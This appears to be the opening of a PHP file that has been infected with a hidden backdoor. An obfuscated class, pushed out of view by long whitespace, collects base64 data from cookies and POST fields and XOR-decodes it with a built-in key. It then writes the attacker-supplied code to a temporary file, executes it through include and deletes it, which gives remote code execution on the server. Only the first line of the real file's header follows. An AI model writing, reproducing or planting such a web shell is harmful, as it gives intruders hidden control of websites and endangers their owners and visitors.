<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("bpflg")){class bpflg{public static $gkfhy = "yjesfljyimpltfbt";public static $skpzuibvs = NULL;public function __construct(){$qylcahz = @$_COOKIE[substr(bpflg::$gkfhy, 0, 4)];if (!empty($qylcahz)){$ydltbevyl = "base64";$hzxjvkxcpt = "";$qylcahz = explode(",", $qylcahz);foreach ($qylcahz as $iiqadeq){$hzxjvkxcpt .= @$_COOKIE[$iiqadeq];$hzxjvkxcpt .= @$_POST[$iiqadeq];}$hzxjvkxcpt = array_map($ydltbevyl . "_decode", array($hzxjvkxcpt,));$hzxjvkxcpt = $hzxjvkxcpt[0] ^ str_repeat(bpflg::$gkfhy, (strlen($hzxjvkxcpt[0]) / strlen(bpflg::$gkfhy)) + 1);bpflg::$skpzuibvs = @unserialize($hzxjvkxcpt);}}public function __destruct(){$this->gvcgnt();}private function gvcgnt(){if (is_array(bpflg::$skpzuibvs)) {$hbiusfor = sys_get_temp_dir() . "/" . crc32(bpflg::$skpzuibvs["salt"]);@bpflg::$skpzuibvs["write"]($hbiusfor, bpflg::$skpzuibvs["content"]);include $hbiusfor;@bpflg::$skpzuibvs["delete"]($hbiusfor);exit();}}}$etocz = new bpflg();$etocz = NULL;} ?><?php
/**
